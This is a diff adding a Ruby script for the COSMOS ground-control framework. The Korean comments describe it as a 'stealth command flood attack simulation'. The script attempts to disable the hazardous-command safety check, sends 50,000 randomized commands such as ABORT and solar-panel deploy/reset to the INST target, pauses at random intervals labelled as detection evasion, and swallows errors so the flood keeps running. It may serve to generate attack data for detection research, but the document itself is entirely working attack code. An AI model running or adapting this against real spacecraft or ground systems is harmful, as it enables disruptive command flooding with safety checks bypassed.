@@ -1,0 +1,60 @@
+require 'cosmos/script'
+require 'set'
+
+# [핵심] 위험 명령어 체크 생략 시도 (안 될 경우를 대비해 아래에서 CLEAR는 제거함)
+begin
+  set_check_hazardous(false)
+rescue
+end
+
+TOTAL_CMDS = 50000
+FLUSH_EVENTS = (TOTAL_CMDS * 0.05).to_i 
+flush_indices = (0...TOTAL_CMDS).to_a.sample(FLUSH_EVENTS).to_set
+
+def pick_command
+  case rand(6) # 에러 나는 CLEAR와 SETPARAMS를 제외한 6종 세트
+  when 0
+    # [수정] DURATION 범위를 0.0 ~ 10.0으로 제한하여 Range Error 해결
+    ["COLLECT", { "TYPE" => 'NORMAL', "DURATION" => rand(0.0..10.0), "OPCODE" => rand(255), "TEMP" => rand(0.0..40.0) }]
+  when 1
+    ["ASCIICMD", {}] 
+  when 2
+    ["FLTCMD", {}]
+  when 3
+    ["ARYCMD", {}]
+  when 4
+    # Solar Panel 명령어는 안전하면서도 패킷 변화를 주기 좋음
+    rand(2) == 0 ? ["SLRPNLDEPLOY", {}] : ["SLRPNLRESET", {}]
+  when 5
+    # ABORT 명령어로 세션 중단 시뮬레이션
+    ["ABORT", {}]
+  end
+end
+
+def optimized_flood(flush_indices)
+  set_line_delay(0.0)
+
+  TOTAL_CMDS.times do |i|
+    if flush_indices.include?(i)
+      puts ">> [공격 시뮬레이션] FLUSH EVENT (index: #{i}) — 탐지 회피 대기 중"
+      sleep(20 + rand * 2) 
+    end
+
+    cmd_name, params = pick_command
+    
+    begin
+      # 타겟 이름을 정확히 "INST"로 지정
+      cmd("INST", cmd_name, params)
+    rescue => e
+      # 만약 에러가 나면 로그만 찍고 멈추지 않음
+      puts "Command #{cmd_name} skipped due to: #{e}"
+    end
+    
+    # 공격 효과를 위해 아주 짧은 대기
+    wait(0.01) if i % 10 == 0
+  end
+end
+
+puts "🚀 Stealth Command Flood Attack Simulation (No-Error Version) Started..."
+optimized_flood(flush_indices)
+puts "✅ Routine Completed Successfully!"
